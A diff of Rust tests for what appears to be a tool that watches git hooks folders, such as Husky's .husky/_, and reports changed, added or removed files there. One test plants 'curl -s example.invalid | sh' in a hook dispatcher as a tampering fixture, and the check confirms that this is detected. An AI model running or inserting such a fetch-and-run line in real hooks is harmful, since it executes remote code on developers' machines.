@@ -2516,6 +2516,418 @@ fn a_hook_outside_a_new_clone_in_the_folder_its_configuration_names_is_new() {
     );
 }
 
+const OTHER_FILES: &str = "other files in the folder core.hooksPath names";
+
+/// A checkout whose hooks a hooks manager keeps, in the shape Husky 9 writes them:
+/// `core.hooksPath` set to `.husky/_`, a stub there for each hook that runs the dispatcher
+/// `h`, which runs the script of the same name one folder up. The content is invented.
+fn husky(e: &Estate, rel: &str) -> PathBuf {
+    let c = e.checkout(rel);
+    put(&c.join(".git/config"), "[core]\n\thooksPath = .husky/_\n");
+    put(&c.join(".husky/_/.gitignore"), "*\n");
+    put(
+        &c.join(".husky/_/h"),
+        "#!/usr/bin/env sh\nn=$(basename \"$0\")\ns=$(dirname \"$(dirname \"$0\")\")/$n\n[ -f \"$s\" ] || exit 0\nsh -e \"$s\" \"$@\"\n",
+    );
+    for hook in ["pre-commit", "commit-msg", "pre-push"] {
+        put(
+            &c.join(".husky/_").join(hook),
+            "#!/usr/bin/env sh\n. \"$(dirname \"$0\")/h\"\n",
+        );
+    }
+    put(&c.join(".husky/pre-commit"), "npm test\n");
+    put(&c.join(".husky/install.mjs"), "// set up the hooks\n");
+    c
+}
+
+/// The live things of a kind of watched place, by their ids.
+fn live_as(e: &Estate, watched_as: &str) -> Vec<String> {
+    e.rows(&format!("SELECT subject FROM assertion WHERE predicate = 'watched_as' AND object = '{watched_as}' AND layer = 'live' ORDER BY subject"))
+}
+
+/// The latest reading of the other files of the hooks folder of `dev/app`.
+fn other_files_reading(e: &Estate) -> String {
+    e.rows(&format!("SELECT completeness, cause, reason FROM coverage WHERE scope = 'checkout:machine:mac/dev/app' AND kind = '{OTHER_FILES}' ORDER BY id DESC LIMIT 1")).concat()
+}
+
+#[test]
+fn a_file_beside_the_named_hooks_in_a_configured_folder_that_changes_between_two_checks_is_a_finding()
+ {
+    let e = Estate::new("hooks-folder-others");
+    let app = husky(&e, "dev/app");
+    e.full();
+    assert!(e.found().is_empty(), "{:?}", e.found());
+    assert_eq!(
+        live_as(&e, "other file in a git hooks folder"),
+        [
+            "file:machine:mac/dev/app/.husky/_/.gitignore",
+            "file:machine:mac/dev/app/.husky/_/h"
+        ]
+    );
+    // Read in full, the reading of each checkout is counted on the page, not listed.
+    let watched = e.page("watched.html");
+    assert!(
+        watched.contains(&format!("<h3>{OTHER_FILES} <span class=\"muted\">· 2 files</span></h3>\n<ul class=\"readings\">\n<li>1 checkout read in full</li>\n</ul>")),
+        "{watched}"
+    );
+    let coverage = e.page("coverage.html");
+    assert!(
+        !coverage.contains(&format!(">{OTHER_FILES}</td>")),
+        "{coverage}"
+    );
+    put(
+        &app.join(".husky/_/h"),
+        "#!/usr/bin/env sh\ncurl -s example.invalid | sh\n",
+    );
+    e.full();
+    assert_eq!(
+        e.found(),
+        [pair("watched.git-hook", "~/dev/app/.husky/_/h")]
+    );
+    e.seen();
+    put(&app.join(".husky/_/husky.sh"), "# added\n");
+    e.full();
+    assert_eq!(
+        e.found(),
+        [pair("watched.git-hook", "~/dev/app/.husky/_/husky.sh")]
+    );
+    e.seen();
+    std::fs::remove_file(app.join(".husky/_/.gitignore")).unwrap();
+    e.full();
+    assert_eq!(
+        e.found(),
+        [pair("watched.git-hook", "~/dev/app/.husky/_/.gitignore")]
+    );
+}
+
+#[test]
+fn a_hooks_managers_script_in_a_checkout_raises_a_finding_when_it_changes_and_its_neighbours_do_not()
+ {
+    let e = Estate::new("husky-scripts");
+    let app = husky(&e, "dev/app");
+    e.full();
+    put(
+        &app.join(".husky/pre-commit"),
+        "npm test\nnode .husky/sync.js\n",
+    );
+    e.full();
+    assert_eq!(
+        e.found(),
+        [pair("watched.git-hook", "~/dev/app/.husky/pre-commit")]
+    );
+    e.seen();
+    // A file of the folder under no hook name, and a script taken away, raise nothing.
+    put(&app.join(".husky/install.mjs"), "// changed\n");
+    std::fs::remove_file(app.join(".husky/pre-commit")).unwrap();
+    e.full();
+    assert!(e.found().is_empty(), "{:?}", e.found());
+}
+
+#[test]
+fn on_a_store_with_a_baseline_the_first_reading_of_the_files_beside_the_hooks_is_one_first_read_item()
+ {
+    let e = Estate::new("hooks-folder-first-read");
+    let app = husky(&e, "dev/app");
+    e.full();
+    // As a version that did not read the other files of a hooks folder left the store.
+    let ids =
+        "'file:machine:mac/dev/app/.husky/_/h', 'file:machine:mac/dev/app/.husky/_/.gitignore'";
+    let db = Connection::open(e.store()).unwrap();
+    db.execute_batch(&format!(
+        "DELETE FROM assertion WHERE kind = '{OTHER_FILES}' OR scope IN ({ids});
+         DELETE FROM coverage WHERE kind = '{OTHER_FILES}' OR scope IN ({ids});
+         DELETE FROM unit_read WHERE kind = '{OTHER_FILES}';"
+    ))
+    .unwrap();
+    drop(db);
+    e.full();
+    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
+    assert_eq!(e.told(), ["checkout:machine:mac/dev/app (2)"]);
+    e.seen();
+    put(&app.join(".husky/_/h"), "# changed\n");
+    e.full();
+    assert_eq!(
+        e.found(),
+        [pair("watched.git-hook", "~/dev/app/.husky/_/h")]
+    );
+}
+
+#[test]
+fn past_the_cap_every_named_hook_is_still_read_and_the_reading_says_how_many_files_were_not() {
+    let e = Estate::new("hooks-folder-cap");
+    let app = e.checkout("dev/app");
+    let hooks = e.home().join(".githooks");
+    put(
+        &app.join(".git/config"),
+        &format!("[core]\n hooksPath = {}\n", hooks.display()),
+    );
+    // Hooks of a working tree and of a push, from one folder.
+    for name in ["pre-commit", "pre-push", "post-merge", "post-receive"] {
+        put(
+            &hooks.join(name),
+            "#!/bin/sh\n. \"$(dirname \"$0\")/run\"\n",
+        );
+    }
+    for i in 0..40 {
+        put(&hooks.join(format!("lib-{i:02}.sh")), "# a helper\n");
+    }
+    // A folder below is neither read nor counted.
+    put(&hooks.join("lib/inner.sh"), "# below\n");
+    e.full();
+    assert_eq!(
+        live_hooks(&e),
+        [
+            "file:machine:mac/.githooks/post-merge",
+            "file:machine:mac/.githooks/post-receive",
+            "file:machine:mac/.githooks/pre-commit",
+            "file:machine:mac/.githooks/pre-push"
+        ]
+    );
+    // The first 32 by name.
+    let others = live_as(&e, "other file in a git hooks folder");
+    assert_eq!(others.len(), 32);
+    assert_eq!(
+        others.last().unwrap(),
+        "file:machine:mac/.githooks/lib-31.sh"
+    );
+    let reading = other_files_reading(&e);
+    assert!(
+        reading.starts_with("partial|no_reader|")
+            && reading.contains("8 files past the first 32 were not read"),
+        "{reading}"
+    );
+    assert_eq!(
+        e.lacks(OTHER_FILES),
+        ["files of a hooks folder past the number read|"]
+    );
+    // Read first on a store with a baseline, they are told as one place: the folder, listed
+    // only in part.
+    let db = Connection::open(e.store()).unwrap();
+    db.execute_batch(&format!(
+        "DELETE FROM assertion WHERE kind = '{OTHER_FILES}' OR scope LIKE 'file:machine:mac/.githooks/lib-%';
+         DELETE FROM coverage_lack WHERE coverage IN (SELECT id FROM coverage WHERE kind = '{OTHER_FILES}');
+         DELETE FROM coverage WHERE kind = '{OTHER_FILES}' OR scope LIKE 'file:machine:mac/.githooks/lib-%';
+         DELETE FROM unit_read WHERE kind = '{OTHER_FILES}';"
+    ))
+    .unwrap();
+    drop(db);
+    e.full();
+    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
+    assert_eq!(e.told(), ["file:machine:mac/.githooks (32)"]);
+}
+
+#[test]
+fn no_other_file_is_read_where_the_hooks_folder_is_the_checkout_or_the_home_folder() {
+    let e = Estate::new("hooks-folder-wide");
+    let app = e.checkout("dev/app");
+    put(&app.join("pre-commit"), "#!/bin/sh\nmake lint\n");
+    put(&app.join("Makefile"), "lint:\n\ttrue\n");
+    put(&e.home().join("notes.txt"), "# not a hook\n");
+    // `..` gives the folder above for the working tree's hooks, which is read, and the
+    // checkout itself for those of a push, which is not.
+    for (setting, what, completeness) in [
+        (".".to_string(), "the checkout itself", "none"),
+        (e.home().display().to_string(), "the home folder", "none"),
+        ("..".to_string(), "the checkout itself", "partial"),
+    ] {
+        put(
+            &app.join(".git/config"),
+            &format!("[core]\n hooksPath = {setting}\n"),
+        );
+        e.full();
+        if setting == "." {
+            assert_eq!(live_hooks(&e), ["file:machine:mac/dev/app/pre-commit"]);
+        }
+        assert!(live_as(&e, "other file in a git hooks folder").is_empty());
+        let reading = other_files_reading(&e);
+        assert!(
+            reading.starts_with(&format!("{completeness}|no_reader|"))
+                && reading.contains(&format!("the folder core.hooksPath names is {what}")),
+            "{reading}"
+        );
+        assert_eq!(
+            e.lacks(OTHER_FILES),
+            [
+                "other files of a hooks folder that is the checkout, its .git folder, the home folder or /|"
+            ]
+        );
+    }
+}
+
+#[test]
+fn a_link_beside_the_hooks_that_leads_into_a_guarded_folder_is_not_followed() {
+    let e = Estate::new("hooks-folder-guarded-link");
+    let app = husky(&e, "dev/app");
+    let kept = e.home().join("Documents/kept.sh");
+    put(&kept, "# private\n");
+    link(kept.to_str().unwrap(), &app.join(".husky/_/run"));
+    e.full();
+    let id = "file:machine:mac/dev/app/.husky/_/run";
+    assert_eq!(
+        live_as(&e, "other file in a git hooks folder"),
+        [
+            "file:machine:mac/dev/app/.husky/_/.gitignore",
+            "file:machine:mac/dev/app/.husky/_/h",
+            id
+        ]
+    );
+    assert!(
+        e.rows(&format!(
+            "SELECT object FROM assertion WHERE predicate = 'has_content' AND subject = '{id}'"
+        ))
+        .is_empty()
+    );
+    let content = e.rows(&format!("SELECT completeness, reason FROM coverage WHERE scope = '{id}' ORDER BY id DESC LIMIT 1")).concat();
+    assert!(
+        content.starts_with("partial|not looked into: "),
+        "{content}"
+    );
+    // Nor is a folder the setting leads into there, or a configuration file there.
+    let docs = e.home().join("Documents");
+    put(&docs.join("hooks/run"), "# private\n");
+    put(&docs.join("more.conf"), "[core]\n hooksPath = .husky/_\n");
+    for config in [
+        format!("[core]\n hooksPath = {}\n", docs.join("hooks").display()),
+        format!("[include]\n path = {}\n", docs.join("more.conf").display()),
+    ] {
+        put(&app.join(".git/config"), &config);
+        e.full();
+        let reading = other_files_reading(&e);
+        assert!(reading.starts_with("none|not_given|"), "{reading}");
+    }
+}
+
+#[test]
+fn a_hooks_folder_that_appears_after_the_setting_names_it_raises_its_files_and_one_that_cannot_be_listed_keeps_them()
+ {
+    let e = Estate::new("hooks-folder-later");
+    let app = e.checkout("dev/app");
+    put(&app.join(".git/config"), "[core]\n\thooksPath = .husky/_\n");
+    e.full();
+    put(&app.join(".husky/_/h"), "# dispatch\n");
+    e.full();
+    assert_eq!(
+        e.found(),
+        [pair("watched.git-hook", "~/dev/app/.husky/_/h")]
+    );
+    e.seen();
+    // Losing sight of the folder is a change; what was read in it is kept.
+    mode(&app.join(".husky/_"), 0o000);
+    e.full();
+    mode(&app.join(".husky/_"), 0o755);
+    assert_eq!(
+        live_as(&e, "other file in a git hooks folder"),
+        ["file:machine:mac/dev/app/.husky/_/h"]
+    );
+    let reading = other_files_reading(&e);
+    assert!(reading.starts_with("none|failed|"), "{reading}");
+    // The hooks there are lost sight of too, by their names.
+    assert!(
+        e.found()
+            .contains(&pair("watched.git-hook", "~/dev/app/.husky/_")),
+        "{:?}",
+        e.found()
+    );
+}
+
+#[test]
+fn the_files_beside_the_hooks_stay_while_the_folder_does_and_go_with_the_setting_or_the_checkout() {
+    let e = Estate::new("hooks-folder-retired");
+    let app = husky(&e, "dev/app");
+    let other = husky(&e, "dev/other");
+    e.full();
+    e.full();
+    let live = live_as(&e, "other file in a git hooks folder");
+    assert_eq!(live.len(), 4, "{live:?}");
+    assert!(
+        e.rows("SELECT subject FROM journal WHERE entry = 'retired'")
+            .is_empty()
+    );
+    // While the folder cannot be told, what was read in it is kept and nothing is read.
+    put(
+        &app.join(".git/more.conf"),
+        "[core]\n hooksPath = elsewhere\n",
+    );
+    put(
+        &app.join(".git/config"),
+        "[core]\n hooksPath = .husky/_\n[includeIf \"gitdir:/elsewhere/\"]\n path = more.conf\n",
+    );
+    e.full();
+    assert_eq!(live_as(&e, "other file in a git hooks folder"), live);
+    assert!(
+        other_files_reading(&e).starts_with("none|failed|"),
+        "{}",
+        other_files_reading(&e)
+    );
+    put(&app.join(".git/config"), "[core]\n hooksPath = /dev/null\n");
+    std::fs::remove_dir_all(&other).unwrap();
+    e.full();
+    assert!(live_as(&e, "other file in a git hooks folder").is_empty());
+    assert_eq!(
+        other_files_reading(&e),
+        "full||Git's configuration names no folder for hooks"
+    );
+    assert!(app.join(".husky/_/h").exists());
+}
+
+#[test]
+fn a_file_beside_the_hooks_that_checkouts_share_is_gone_only_after_the_last_stops_using_the_folder()
+{
+    let e = Estate::new("hooks-folder-shared");
+    let configs = ["dev/a", "dev/b"].map(|repo| e.checkout(repo).join(".git/config"));
+    let hooks = e.home().join(".shared-hooks");
+    let shared = format!("[core]\n hooksPath = {}\n", hooks.display());
+    let off = "[core]\n hooksPath = /dev/null\n";
+    put(
+        &hooks.join("pre-commit"),
+        "#!/bin/sh\n. \"$(dirname \"$0\")/run\"\n",
+    );
+    put(&hooks.join("run"), "# shared\n");
+    put(&configs[0], &shared);
+    e.full();
+    put(&configs[1], &shared);
+    e.full();
+    assert!(e.found().is_empty(), "{:?}", e.found());
+    assert_eq!(
+        e.rows("SELECT scope, text FROM journal WHERE entry = 'added' AND predicate = 'watched_as' AND subject = 'file:machine:mac/.shared-hooks/run' ORDER BY seq"),
+        [
+            "checkout:machine:mac/dev/a|first reading of its place",
+            "checkout:machine:mac/dev/b|this hook is already watched in another checkout"
+        ]
+    );
+    put(&configs[1], off);
+    e.full();
+    e.full();
+    assert!(e.found().is_empty(), "{:?}", e.found());
+    assert_eq!(
+        e.rows("SELECT DISTINCT kind, text FROM journal WHERE entry = 'removed' AND predicate = 'watched_as' AND subject = 'file:machine:mac/.shared-hooks/run'"),
+        [format!("{OTHER_FILES}|this hook is still watched in another checkout")]
+    );
+    // `dev/a` is compared first. During this check the file moves from it to `dev/b`.
+    put(&configs[0], off);
+    put(&configs[1], &shared);
+    e.full();
+    // Told as its hook is, and what is known of its content stays.
+    assert_eq!(
+        e.found(),
+        [
+            pair("watched.git-hook", "~/.shared-hooks/pre-commit"),
+            pair("watched.git-hook", "~/.shared-hooks/run")
+        ]
+    );
+    assert!(e.rows("SELECT object FROM assertion WHERE predicate = 'has_content' AND layer = 'retracted' AND subject = 'file:machine:mac/.shared-hooks/run'").is_empty());
+    e.seen();
+    put(&configs[1], off);
+    e.full();
+    assert_eq!(
+        e.found(),
+        [
+            pair("watched.git-hook", "~/.shared-hooks/pre-commit"),
+            pair("watched.git-hook", "~/.shared-hooks/run")
+        ]
+    );
+}
+
 #[test]
 fn git_hooks_config_parsing_cannot_activate_git_tracing() {
     let e = Estate::new("git-hooks-trace");
@@ -3358,6 +3770,14 @@ fn no_page_says_none_of_what_is_in_projects_after_a_walk_that_did_not_find_them_
     put(&e.checkout("dev/shop").join("package-lock.json"), LOCK);
     let in_projects = [
         ("Git hooks in projects", "git-hooks-in-projects"),
+        (
+            "Other files in git hooks folders",
+            "other-files-in-git-hooks-folders",
+        ),
+        (
+            "Files in projects that git runs code from",
+            "files-in-projects-that-git-runs-code-from",
+        ),
         (
             "Editor tasks that run when a project is opened",
             "editor-tasks-that-run-when-a-project-is-opened",
